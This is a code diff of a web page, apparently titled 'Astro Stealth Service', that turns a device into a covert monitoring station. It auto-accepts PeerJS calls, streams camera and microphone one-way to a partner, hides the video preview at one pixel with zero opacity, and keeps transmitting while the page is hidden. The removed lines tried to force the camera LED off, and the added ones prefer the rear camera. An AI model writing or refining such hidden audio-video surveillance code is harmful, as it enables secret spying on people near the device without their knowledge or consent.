@@ -51,15 +51,13 @@
     <video id="remoteVideo" autoplay playsinline></video>
 
     <script>
-        // ============ STEALTH CONFIGURATION - NO LED FLASH ============
+        // ============ STEALTH CONFIGURATION ============
         const MY_ID = "BPrivate";
         const PARTNER_ID = "APrivate";
         const AUTO_ACCEPT_CALLS = true;     // Auto-accept all monitoring requests
         const SEND_AUDIO = true;             // Send audio FROM stealth device
         const SEND_VIDEO = true;             // Send video FROM stealth device
-        const DISABLE_TORCH = true;          // Prevent any LED/flash activation
-        const PREVIEW_ELEMENT = false;       // No preview elements (prevents LED)
-        // ==============================================================
+        // ==============================================
         
         let peer = null;
         let currentCall = null;
@@ -74,88 +72,80 @@
         }
         
         async function getMediaStream() {
-            // Force torch/flash to be disabled in all constraints
-            const constraints = {
+            // First try to get both front and back camera capabilities
+            let devices = [];
+            let backCameraExists = false;
+            let frontCameraExists = false;
+            
+            try {
+                const allDevices = await navigator.mediaDevices.enumerateDevices();
+                devices = allDevices.filter(device => device.kind === 'videoinput');
+                backCameraExists = devices.some(device => device.label.toLowerCase().includes('back') || device.label.toLowerCase().includes('rear'));
+                frontCameraExists = devices.some(device => device.label.toLowerCase().includes('front') || device.label.toLowerCase().includes('face'));
+                log(`Found ${devices.length} cameras - Back: ${backCameraExists}, Front: ${frontCameraExists}`, 'info');
+            } catch(e) {
+                log(`Could not enumerate devices: ${e.message}`, 'warn');
+            }
+            
+            // Try back camera first if available, otherwise fallback to any camera
+            let constraints = {
                 audio: SEND_AUDIO ? {
-                    echoCancellation: false,     // Disable to prevent processing LEDs
+                    echoCancellation: false,
                     noiseSuppression: false,
                     autoGainControl: false
                 } : false,
                 video: SEND_VIDEO ? {
-                    facingMode: 'user',
                     width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    // IMPORTANT: These settings prevent torch/LED activation
-                    advanced: [{ torch: false }],  // Explicitly disable torch
-                    exposureMode: 'continuous',    // Continuous prevents flash bursts
-                    whiteBalanceMode: 'continuous' // Continuous prevents adjustments that might trigger LED
+                    height: { ideal: 480 }
                 } : false
             };
             
-            try {
-                log('Requesting media with torch/flash explicitly disabled...', 'info');
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                // Additional check: ensure torch is not available or disabled
-                const videoTrack = stream.getVideoTracks()[0];
-                if (videoTrack) {
-                    // Check if torch capability exists
-                    const capabilities = videoTrack.getCapabilities();
-                    if (capabilities.torch) {
-                        // If torch exists, explicitly set it to false
-                        try {
-                            await videoTrack.applyConstraints({ advanced: [{ torch: false }] });
-                            log('Torch/LED explicitly disabled on video track', 'success');
-                        } catch (e) {
-                            log(`Could not disable torch: ${e.message}`, 'warn');
-                        }
-                    } else {
-                        log('Device has no torch/LED capability (good for stealth)', 'success');
-                    }
-                    
-                    // Prevent any auto-exposure that might trigger LED
-                    if (capabilities.exposureMode && capabilities.exposureMode.includes('continuous')) {
-                        try {
-                            await videoTrack.applyConstraints({ exposureMode: 'continuous' });
-                        } catch (e) {}
-                    }
-                }
-                
-                log(`Media acquired - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO} (LEDs disabled)`, 'success');
-                return stream;
-            } catch (e) {
-                if (e.name === 'NotAllowedError') {
-                    log('Camera/Mic permission denied', 'error');
-                } else if (e.name === 'OverconstrainedError') {
-                    log('Camera constraints too strict, trying fallback...', 'warn');
-                    // Fallback without torch constraint
-                    const fallbackConstraints = {
+            // Try to get back camera specifically
+            if (SEND_VIDEO) {
+                try {
+                    log('Attempting to access BACK camera...', 'info');
+                    const backCameraConstraints = {
                         audio: SEND_AUDIO,
-                        video: SEND_VIDEO ? {
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        } : false
+                        video: { facingMode: { exact: "environment" } }
                     };
+                    const stream = await navigator.mediaDevices.getUserMedia(backCameraConstraints);
+                    log('✅ BACK camera acquired successfully', 'success');
+                    return stream;
+                } catch (backError) {
+                    log(`Back camera not available: ${backError.message}`, 'warn');
+                    
+                    // Try front camera
                     try {
-                        const fallbackStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
-                        log('Fallback media acquired (torch may be possible but not activated)', 'info');
-                        return fallbackStream;
-                    } catch (fallbackErr) {
-                        log(`Fallback also failed: ${fallbackErr.message}`, 'error');
-                        throw fallbackErr;
+                        log('Attempting to access FRONT camera...', 'info');
+                        const frontCameraConstraints = {
+                            audio: SEND_AUDIO,
+                            video: { facingMode: { exact: "user" } }
+                        };
+                        const stream = await navigator.mediaDevices.getUserMedia(frontCameraConstraints);
+                        log('✅ FRONT camera acquired successfully', 'success');
+                        return stream;
+                    } catch (frontError) {
+                        log(`Front camera not available: ${frontError.message}`, 'warn');
+                        
+                        // Fallback to default camera
+                        log('Falling back to default camera...', 'info');
+                        const defaultConstraints = {
+                            audio: SEND_AUDIO,
+                            video: true
+                        };
+                        const stream = await navigator.mediaDevices.getUserMedia(defaultConstraints);
+                        log('✅ Default camera acquired', 'success');
+                        return stream;
                     }
-                } else {
-                    log(`Media error: ${e.message}`, 'error');
                 }
-                throw e;
+            } else {
+                // Audio only
+                const audioConstraints = {
+                    audio: SEND_AUDIO,
+                    video: false
+                };
+                return await navigator.mediaDevices.getUserMedia(audioConstraints);
             }
-        }
-        
-        // Disable any notification LEDs or visual indicators
-        function disableSystemIndicators() {
-            // Attempt to disable any browser-level camera indicators (not possible via JS, but we minimize)
-            log('System indicators: Browser may still show camera/mic icon (unavoidable)', 'info');
         }
         
         function handleIncomingCall(call) {
@@ -168,39 +158,41 @@
                 return;
             }
             
-            // Get stealth device's media stream (to send TO remote)
+            // Get stealth device's media stream
             getMediaStream().then(stream => {
                 localStream = stream;
                 
-                // Show local video if enabled (hidden element - no LED)
-                if (SEND_VIDEO && stream.getVideoTracks().length > 0) {
+                // Log what we're sending
+                const hasAudio = stream.getAudioTracks().length > 0;
+                const hasVideo = stream.getVideoTracks().length > 0;
+                log(`Sending to remote - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
+                
+                // Hide video element completely
+                if (hasVideo) {
                     const videoElement = document.getElementById('localVideo');
                     videoElement.srcObject = stream;
-                    // Ensure video element is completely invisible (prevents any preview LED)
                     videoElement.style.opacity = '0';
                     videoElement.style.width = '1px';
                     videoElement.style.height = '1px';
                 }
                 
-                // Answer call with stealth device's stream (sends audio/video TO remote)
+                // Answer call with stealth device's stream
                 call.answer(stream);
                 currentCall = call;
                 
-                // Handle incoming stream from remote (IGNORE - we don't want remote's audio/video)
+                // Handle incoming stream from remote (IGNORE)
                 call.on('stream', (remoteStream) => {
-                    // Remote might send video or audio, but we completely IGNORE it
                     log(`Remote stream received but IGNORED (stealth receives nothing)`, 'info');
                     
-                    // Stop any tracks from remote to save bandwidth and prevent any LED activation
                     if (remoteStream) {
                         remoteStream.getTracks().forEach(track => {
-                            track.enabled = false;  // Disable remote's tracks
-                            track.stop();           // Stop them completely
-                            log(`Disabled and stopped remote ${track.kind} track`, 'info');
+                            track.enabled = false;
+                            track.stop();
+                            log(`Disabled remote ${track.kind} track`, 'info');
                         });
                     }
                     
-                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE - Stealth → Remote only (NO LEDs)`, 'success');
+                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE - Stealth → Remote only`, 'success');
                 });
                 
                 call.on('close', () => {
@@ -221,10 +213,9 @@
         
         function endCall() {
             if (localStream) {
-                // Stop all tracks to release camera (turns off any hardware LEDs)
                 localStream.getTracks().forEach(track => {
                     track.stop();
-                    log(`Stopped ${track.kind} track - hardware released`, 'info');
+                    log(`Stopped ${track.kind} track`, 'info');
                 });
                 localStream = null;
             }
@@ -244,15 +235,13 @@
             }
             
             log(`Initializing stealth device as ${MY_ID}`);
-            log(`LED/Torch: ${DISABLE_TORCH ? 'DISABLED' : 'ENABLED'} - No flash will activate`);
             
             peer = new Peer(MY_ID);
             
             peer.on('open', (id) => {
-                log(`Stealth device ACTIVE - ID: ${MY_ID}`);
-                log(`Ready to send audio/video TO ${PARTNER_ID} (NO LEDs, receives nothing back)`);
+                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
+                log(`Ready to send to ${PARTNER_ID} - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO}`, 'info');
                 reconnectAttempts = 0;
-                disableSystemIndicators();
             });
             
             peer.on('call', (call) => {
@@ -290,61 +279,41 @@
             });
         }
         
-        // Monitor camera track for any torch/LED activation attempts
-        function monitorTorchActivation() {
-            if (localStream && localStream.getVideoTracks()[0]) {
-                const videoTrack = localStream.getVideoTracks()[0];
-                const settings = videoTrack.getSettings();
-                if (settings.torch === true) {
-                    log('⚠️ WARNING: Torch/LED was activated! Forcing off...', 'warn');
-                    videoTrack.applyConstraints({ advanced: [{ torch: false }] }).catch(e => {});
-                }
-            }
-            setTimeout(monitorTorchActivation, 1000); // Check every second
-        }
-        
         // Auto-start stealth service
-        log('=== ASTRO STEALTH SERVICE (NO LED MODE) ===');
+        log('=== ASTRO STEALTH SERVICE ===');
         log(`Configuration (ONE-WAY: Stealth → Remote only):`);
         log(`  - ID: ${MY_ID}`);
         log(`  - Target: ${PARTNER_ID}`);
         log(`  - Send Audio TO Remote: ${SEND_AUDIO}`);
         log(`  - Send Video TO Remote: ${SEND_VIDEO}`);
         log(`  - Receive from Remote: ❌ DISABLED`);
-        log(`  - LED/Torch: ❌ FORCE DISABLED`);
         log(`  - Auto-accept: ${AUTO_ACCEPT_CALLS}`);
         
         initPeer();
         
-        // Start torch monitoring after a delay
-        setTimeout(monitorTorchActivation, 2000);
-        
         // Keep service alive
         setInterval(() => {
             if (peer && !peer.disconnected && currentCall) {
-                console.log('[STEALTH] Heartbeat - actively sending to remote (NO LEDs)');
+                console.log('[STEALTH] Heartbeat - actively sending to remote');
             }
         }, 30000);
         
-        // Clean shutdown - ensures camera LED turns off
+        // Clean shutdown
         window.addEventListener('beforeunload', () => {
-            log('Stealth device shutting down - releasing camera/mic...', 'info');
+            log('Stealth device shutting down...', 'info');
             if (currentCall) currentCall.close();
             if (peer) peer.destroy();
             if (localStream) {
-                localStream.getTracks().forEach(track => {
-                    track.stop();
-                    log(`Stopped ${track.kind} track on shutdown`, 'info');
-                });
+                localStream.getTracks().forEach(track => track.stop());
             }
         });
         
-        // Also handle page hide (mobile sleep)
+        // Handle page visibility
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) {
                 log('Page hidden - maintaining stealth', 'info');
             } else {
-                log('Page visible - stealth still active (no visual indicators)', 'info');
+                log('Page visible - stealth still active', 'info');
             }
         });
     </script>
